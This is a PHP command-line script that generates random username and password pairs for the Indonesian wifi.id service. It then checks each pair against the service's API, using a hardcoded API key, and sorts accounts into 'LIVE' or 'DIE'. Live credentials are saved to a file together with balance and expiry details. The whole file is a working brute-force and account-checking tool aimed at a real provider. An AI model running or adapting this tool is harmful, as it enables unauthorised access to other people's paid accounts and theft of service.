<?php  

echo "======================================= \n";
echo "         created by Fikri.              \n";
echo "======================================= \n";

echo "[1] xtrap wifi.id \n";
echo "[2] check result list \n";
echo "[?] choose your option : ";
$opsi = trim(fgets(STDIN));


if ($opsi == "2") {
echo "[?] enter file result : ";
$file = file(trim(fgets(STDIN)));
echo "[?] enter delimiter : ";
$delim = trim(fgets(STDIN));

foreach ($file as $akon => $data) {
	$pisah = explode($delim, $data);
	$user = trim($pisah[0]);
	$pass = trim($pisah[1]);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://caramel.wifi.id/api/ott/v2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"password\":\"$pass\",\"username\":\"$user\"}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'X-Api-Key: 8d446f02-ef8d-47b2-9663-dbe75b016fb9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Cache-Control: max-age=0, no-cache';
$headers[] = 'Pragma: no-cache';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
	$act = $json->act;
	$exp = $json->expire;
	$amount = $json->amount;
	$duration = $json->duration;
	$hour = $json->hour;
	if ($act == "INVALID") {
		echo "DIE => $user|$pass \n";
	}else{
		echo "LIVE => username: $user | password: $pass | expire: $exp | amount: $amount | duration: $duration | hour: $hour \n";
		fwrite(fopen("wifi.txt", "a"), "LIVE => username: $user | password: $pass | expire: $exp | amount: $amount | duration: $duration | hour: $hour \n");
	}


}
}else{
	echo "[?] awalan xtrap : ";
	$x = trim(fgets(STDIN));
	echo "[?] jumlah xtrap : ";
	$jmlh = trim(fgets(STDIN));
	
	$i = 0;
	while ($i < $jmlh) {
		$user = $x.number(str_replace("-", "", strlen($x) -15));
		$pass = name(3);
		echo "$user|$pass \n";
		fwrite(fopen("result.txt", "a"), "$user|$pass \n");
		$i++;
	}
	echo "result saved to result.txt \n";
}
function number($r){
	$abc = "1234567890";
	$word = "";
	for ($i=0; $i < $r ; $i++) { 
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}

function name($q){
	$abc = "abcdefghijklmnopqrstuvwxyz";
	$word = "";
	for ($i=0; $i < $q ; $i++) { 
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}


?>
